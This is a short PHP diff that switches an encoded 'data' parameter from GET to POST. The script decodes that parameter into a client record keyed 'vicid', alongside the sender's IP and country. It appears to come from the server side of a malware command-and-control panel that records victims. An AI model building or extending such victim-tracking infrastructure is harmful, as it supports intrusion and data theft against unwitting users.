@@ -10,7 +10,7 @@ $client = new Clients;
 $ipaddress = $utils->sanitize($_SERVER['REMOTE_ADDR']);
 $country = getConteryCode($ipaddress);
 $date = date("Y-m-d");
-$data = isset($_GET['data']) ? explode("|BN|", $utils->sanitize($utils->base64_decode_url($_GET['data']))) : '';
+$data = isset($_POST['data']) ? explode("|BN|", $utils->sanitize($utils->base64_decode_url($_POST['data']))) : '';
 
 $clientdata = [
     'vicid' => $data[0],
